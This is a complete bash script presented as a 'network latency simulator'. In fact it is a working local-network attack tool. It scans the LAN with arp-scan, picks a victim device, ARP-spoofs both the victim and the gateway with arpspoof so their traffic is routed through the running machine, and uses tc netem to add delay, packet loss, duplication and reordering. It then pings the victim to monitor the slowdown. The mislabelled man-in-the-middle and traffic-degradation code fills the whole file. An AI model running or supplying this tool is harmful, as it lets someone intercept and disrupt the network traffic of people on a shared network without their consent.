#!/bin/bash

# =============================================================================
#  slow.sh – ZETA NETWORK LATENCY SIMULATOR
#  Version 4.1 – Clean Technical Edition
# =============================================================================
#  Usage: ./slow.sh [OPTIONS]
#  
#  Options:
#    -t, --target IP      Target IP address
#    -l, --latency MS     Base latency in milliseconds (default: 2000)
#    -j, --jitter MS      Jitter in milliseconds (default: 500)
#    -p, --loss PERCENT   Packet loss percentage (default: 0)
#    -d, --duplicate %    Packet duplication percentage (default: 0)
#    -r, --reorder %      Packet reordering percentage (default: 0)
#    -i, --interface IF   Network interface (auto-detected)
#    -g, --gateway IP     Gateway IP (auto-detected)
#    --scan-only          Scan network and exit
#    --list-devices       List known devices and exit
#    --config             Edit configuration file
#    -h, --help           Show this help
# =============================================================================

# -----------------------------------------------------------------------------
# CONFIGURATION (loaded from ~/.zeta_network.conf if exists)
# -----------------------------------------------------------------------------
CONFIG_FILE="$HOME/.zeta_network.conf"

# Default colours (ANSI)
COLOR_INFO="\033[0;34m"      # Blue
COLOR_OK="\033[0;32m"        # Green
COLOR_WARN="\033[1;33m"      # Yellow
COLOR_ERR="\033[0;31m"       # Red
COLOR_CMD="\033[1;33m"       # Bold Yellow
COLOR_TARGET="\033[0;36m"    # Cyan
COLOR_RESET="\033[0m"
COLOR_DIM="\033[2m"

# Default settings
DEFAULT_LATENCY=2000
DEFAULT_JITTER=500
DEFAULT_LOSS=0
DEFAULT_DUPLICATE=0
DEFAULT_REORDER=0
DEFAULT_INTERFACE=""
DEFAULT_GATEWAY=""

# Load config if exists
if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
fi

# -----------------------------------------------------------------------------
# FUNCTIONS
# -----------------------------------------------------------------------------
log_info() {
    echo -e "${COLOR_INFO}[INFO]${COLOR_RESET} $1"
}

log_ok() {
    echo -e "${COLOR_OK}[OK]${COLOR_RESET} $1"
}

log_warn() {
    echo -e "${COLOR_WARN}[WARN]${COLOR_RESET} $1"
}

log_err() {
    echo -e "${COLOR_ERR}[ERROR]${COLOR_RESET} $1"
}

log_cmd() {
    echo -e "${COLOR_DIM}[EXEC]${COLOR_RESET} ${COLOR_CMD}$1${COLOR_RESET}"
}

log_target() {
    echo -e "${COLOR_TARGET}[TARGET]${COLOR_RESET} $1"
}

show_help() {
    cat << EOF
${COLOR_OK}ZETA NETWORK LATENCY SIMULATOR v4.1${COLOR_RESET}

Usage: $0 [OPTIONS]

Options:
  -t, --target IP      Target IP address
  -l, --latency MS     Base latency in ms (default: $DEFAULT_LATENCY)
  -j, --jitter MS      Jitter in ms (default: $DEFAULT_JITTER)
  -p, --loss PERCENT   Packet loss %% (default: $DEFAULT_LOSS)
  -d, --duplicate %%   Packet duplication %% (default: $DEFAULT_DUPLICATE)
  -r, --reorder %%     Packet reordering %% (default: $DEFAULT_REORDER)
  -i, --interface IF   Network interface (auto-detected)
  -g, --gateway IP     Gateway IP (auto-detected)
  --scan-only          Scan network and exit
  --list-devices       Show known devices and exit
  --config             Edit configuration file
  -h, --help           Show this help

Examples:
  $0 -t 192.168.1.100 -l 3000 -j 500
  $0 --target 192.168.1.100 --latency 2500 --loss 5
  $0 --scan-only

EOF
}

# -----------------------------------------------------------------------------
# CONFIG EDITOR
# -----------------------------------------------------------------------------
edit_config() {
    cat > "$CONFIG_FILE" << 'EOF'
# ZETA Network Configuration
# Edit these values to customise colours and defaults

# Colour settings (ANSI codes)
COLOR_INFO="\033[0;34m"      # Blue
COLOR_OK="\033[0;32m"        # Green
COLOR_WARN="\033[1;33m"      # Yellow
COLOR_ERR="\033[0;31m"       # Red
COLOR_CMD="\033[1;33m"       # Bold Yellow
COLOR_TARGET="\033[0;36m"    # Cyan
COLOR_RESET="\033[0m"
COLOR_DIM="\033[2m"

# Default settings
DEFAULT_LATENCY=2000
DEFAULT_JITTER=500
DEFAULT_LOSS=0
DEFAULT_DUPLICATE=0
DEFAULT_REORDER=0
DEFAULT_INTERFACE=""
DEFAULT_GATEWAY=""
EOF

    if [ -n "$EDITOR" ]; then
        $EDITOR "$CONFIG_FILE"
    else
        echo "Set your EDITOR environment variable or edit manually: $CONFIG_FILE"
        nano "$CONFIG_FILE"
    fi
    exit 0
}

# -----------------------------------------------------------------------------
# DETECT NETWORK
# -----------------------------------------------------------------------------
detect_network() {
    log_info "Detecting network configuration..."
    
    INTERFACE="$DEFAULT_INTERFACE"
    if [ -z "$INTERFACE" ]; then
        INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)
    fi
    
    if [ -z "$INTERFACE" ]; then
        log_err "Could not detect network interface."
        exit 1
    fi
    
    GATEWAY="$DEFAULT_GATEWAY"
    if [ -z "$GATEWAY" ]; then
        GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
    fi
    
    if [ -z "$GATEWAY" ]; then
        log_err "Could not detect gateway."
        exit 1
    fi
    
    MY_IP=$(ip -4 addr show "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    if [ -z "$MY_IP" ]; then
        log_err "Could not determine IP for interface $INTERFACE"
        exit 1
    fi
    
    log_ok "Interface: $INTERFACE"
    log_ok "Gateway: $GATEWAY"
    log_ok "Your IP: $MY_IP"
    echo ""
}

# -----------------------------------------------------------------------------
# SCAN DEVICES
# -----------------------------------------------------------------------------
scan_devices() {
    log_info "Scanning for active devices..."
    
    ARP_OUTPUT=$(sudo arp-scan --local 2>/dev/null)
    if [ -z "$ARP_OUTPUT" ]; then
        log_err "arp-scan returned no output. Check permissions."
        exit 1
    fi
    
    DEVICES=$(echo "$ARP_OUTPUT" | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep -v "Starting" | grep -v "packets received")
    
    IP_LIST=()
    MAC_LIST=()
    VENDOR_LIST=()
    
    while IFS= read -r line; do
        IP=$(echo "$line" | awk '{print $1}')
        MAC=$(echo "$line" | awk '{print $2}')
        VENDOR=$(echo "$line" | cut -d' ' -f3-)
        if [[ "$IP" != "$MY_IP" ]]; then
            IP_LIST+=("$IP")
            MAC_LIST+=("$MAC")
            VENDOR_LIST+=("$VENDOR")
        fi
    done <<< "$DEVICES"
    
    if [ ${#IP_LIST[@]} -eq 0 ]; then
        log_err "No other devices found on the network."
        exit 1
    fi
    
    log_ok "Found ${#IP_LIST[@]} device(s)"
    echo ""
}

# -----------------------------------------------------------------------------
# DISPLAY DEVICES
# -----------------------------------------------------------------------------
display_devices() {
    echo "  #  IP Address        MAC Address        Vendor"
    echo "  ------------------------------------------------------------"
    for i in "${!IP_LIST[@]}"; do
        printf "  %-2d %-18s %-18s %s\n" \
            "$((i+1))" "${IP_LIST[$i]}" "${MAC_LIST[$i]}" "${VENDOR_LIST[$i]:0:30}"
    done
    echo "  ------------------------------------------------------------"
    echo "  0  Exit"
    echo ""
}

# -----------------------------------------------------------------------------
# SELECT TARGET
# -----------------------------------------------------------------------------
select_target() {
    while true; do
        read -p "Select target (1-${#IP_LIST[@]}) [0=exit]: " SELECTION
        
        if [[ "$SELECTION" == "0" ]]; then
            log_info "Exiting."
            exit 0
        fi
        
        if [[ "$SELECTION" =~ ^[0-9]+$ ]] && [ "$SELECTION" -ge 1 ] && [ "$SELECTION" -le "${#IP_LIST[@]}" ]; then
            INDEX=$((SELECTION-1))
            TARGET_IP="${IP_LIST[$INDEX]}"
            TARGET_MAC="${MAC_LIST[$INDEX]}"
            TARGET_VENDOR="${VENDOR_LIST[$INDEX]}"
            log_target "Selected: $TARGET_IP ($TARGET_VENDOR)"
            break
        else
            log_warn "Invalid selection."
        fi
    done
    echo ""
}

# -----------------------------------------------------------------------------
# CONFIGURE PARAMETERS
# -----------------------------------------------------------------------------
configure_params() {
    read -p "Latency (ms) [$DEFAULT_LATENCY]: " LATENCY
    LATENCY=${LATENCY:-$DEFAULT_LATENCY}
    
    read -p "Jitter (ms) [$DEFAULT_JITTER]: " JITTER
    JITTER=${JITTER:-$DEFAULT_JITTER}
    
    read -p "Loss (%) [$DEFAULT_LOSS]: " LOSS
    LOSS=${LOSS:-$DEFAULT_LOSS}
    
    read -p "Duplicate (%) [$DEFAULT_DUPLICATE]: " DUPLICATE
    DUPLICATE=${DUPLICATE:-$DEFAULT_DUPLICATE}
    
    read -p "Reorder (%) [$DEFAULT_REORDER]: " REORDER
    REORDER=${REORDER:-$DEFAULT_REORDER}
    
    echo ""
    log_info "Configuration:"
    log_info "  Target  : $TARGET_IP"
    log_info "  Latency : ${LATENCY}ms"
    log_info "  Jitter  : ${JITTER}ms"
    log_info "  Loss    : ${LOSS}%"
    log_info "  Dup     : ${DUPLICATE}%"
    log_info "  Reorder : ${REORDER}%"
    echo ""
    
    read -p "Start? (y/n): " CONFIRM
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        log_info "Aborted."
        exit 0
    fi
}

# -----------------------------------------------------------------------------
# EXECUTE
# -----------------------------------------------------------------------------
execute() {
    log_info "Enabling IP forwarding..."
    log_cmd "sysctl -w net.ipv4.ip_forward=1"
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
    log_ok "Forwarding enabled"
    echo ""
    
    log_info "Starting ARP spoofing..."
    log_cmd "arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY"
    sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" > /dev/null 2>&1 &
    SPOOF1=$!
    log_ok "Spoof $TARGET_IP -> $GATEWAY (PID $SPOOF1)"
    
    log_cmd "arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP"
    sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" > /dev/null 2>&1 &
    SPOOF2=$!
    log_ok "Spoof $GATEWAY -> $TARGET_IP (PID $SPOOF2)"
    echo ""
    sleep 2
    
    log_info "Applying traffic control..."
    TC_CMD="tc qdisc add dev $INTERFACE root netem"
    TC_CMD="$TC_CMD delay ${LATENCY}ms ${JITTER}ms"
    [ "$LOSS" -gt 0 ] && TC_CMD="$TC_CMD loss ${LOSS}%"
    [ "$DUPLICATE" -gt 0 ] && TC_CMD="$TC_CMD duplicate ${DUPLICATE}%"
    [ "$REORDER" -gt 0 ] && TC_CMD="$TC_CMD reorder ${REORDER}% gap 5"
    
    log_cmd "$TC_CMD"
    sudo $TC_CMD
    
    if [ $? -eq 0 ]; then
        log_ok "Traffic control applied"
    else
        log_err "Failed to apply traffic control"
        cleanup
        exit 1
    fi
    echo ""
}

# -----------------------------------------------------------------------------
# MONITOR
# -----------------------------------------------------------------------------
monitor() {
    log_info "Monitoring (Ctrl+C to stop)"
    echo ""
    echo "  Target: $TARGET_IP | Latency: ${LATENCY}ms | Jitter: ${JITTER}ms | Loss: ${LOSS}%"
    echo "  ------------------------------------------------------------"
    
    trap 'echo ""; log_warn "Stopping..."; cleanup; exit 0' INT
    
    COUNT=0
    TOTAL=0
    MIN=999999
    MAX=0
    
    while true; do
        PING=$(ping -c 1 -W 1 "$TARGET_IP" 2>/dev/null | grep "time=" | awk -F'time=' '{print $2}' | cut -d' ' -f1)
        
        if [ -n "$PING" ]; then
            MS=$(printf "%.0f" "$PING")
            COUNT=$((COUNT + 1))
            TOTAL=$((TOTAL + MS))
            [ $MS -lt $MIN ] && MIN=$MS
            [ $MS -gt $MAX ] && MAX=$MS
            AVG=$((TOTAL / COUNT))
            
            if [ "$MS" -gt 1000 ]; then
                STATUS="${COLOR_ERR}SLOW${COLOR_RESET}"
            elif [ "$MS" -gt 500 ]; then
                STATUS="${COLOR_WARN}LAG${COLOR_RESET}"
            else
                STATUS="${COLOR_OK}OK${COLOR_RESET}"
            fi
            
            echo -e "  [$(date +%H:%M:%S)] [$STATUS] ${MS}ms  (min:${MIN} max:${MAX} avg:${AVG} pkts:${COUNT})"
        else
            echo -e "  [$(date +%H:%M:%S)] [${COLOR_ERR}DOWN${COLOR_RESET}] target unreachable"
        fi
        
        sleep 1
    done
}

# -----------------------------------------------------------------------------
# CLEANUP
# -----------------------------------------------------------------------------
cleanup() {
    echo ""
    log_info "Cleaning up..."
    
    log_cmd "tc qdisc del dev $INTERFACE root"
    sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
    log_ok "Traffic control removed"
    
    log_cmd "kill $SPOOF1 $SPOOF2"
    sudo kill "$SPOOF1" "$SPOOF2" 2>/dev/null
    sudo killall arpspoof 2>/dev/null
    log_ok "ARP spoofing stopped"
    
    log_cmd "sysctl -w net.ipv4.ip_forward=0"
    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1
    log_ok "IP forwarding disabled"
    
    echo ""
    log_ok "Cleanup complete. Target restored."
}

# -----------------------------------------------------------------------------
# PARSE ARGUMENTS
# -----------------------------------------------------------------------------
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)     TARGET_IP="$2"; shift 2 ;;
        -l|--latency)    LATENCY="$2"; shift 2 ;;
        -j|--jitter)     JITTER="$2"; shift 2 ;;
        -p|--loss)       LOSS="$2"; shift 2 ;;
        -d|--duplicate)  DUPLICATE="$2"; shift 2 ;;
        -r|--reorder)    REORDER="$2"; shift 2 ;;
        -i|--interface)  INTERFACE="$2"; shift 2 ;;
        -g|--gateway)    GATEWAY="$2"; shift 2 ;;
        --scan-only)     SCAN_ONLY=true; shift ;;
        --list-devices)  LIST_DEVICES=true; shift ;;
        --config)        edit_config; shift ;;
        -h|--help)       show_help; exit 0 ;;
        *)               log_err "Unknown option: $1"; show_help; exit 1 ;;
    esac
done

# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
detect_network

if [ "$SCAN_ONLY" = true ]; then
    scan_devices
    display_devices
    exit 0
fi

if [ "$LIST_DEVICES" = true ]; then
    scan_devices
    display_devices
    exit 0
fi

if [ -n "$TARGET_IP" ]; then
    log_target "Target: $TARGET_IP"
    
    LATENCY=${LATENCY:-$DEFAULT_LATENCY}
    JITTER=${JITTER:-$DEFAULT_JITTER}
    LOSS=${LOSS:-$DEFAULT_LOSS}
    DUPLICATE=${DUPLICATE:-$DEFAULT_DUPLICATE}
    REORDER=${REORDER:-$DEFAULT_REORDER}
    
    log_info "Latency: ${LATENCY}ms, Jitter: ${JITTER}ms, Loss: ${LOSS}%"
    echo ""
    read -p "Start? (y/n): " CONFIRM
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        log_info "Aborted."
        exit 0
    fi
else
    scan_devices
    display_devices
    select_target
    configure_params
fi

execute
monitor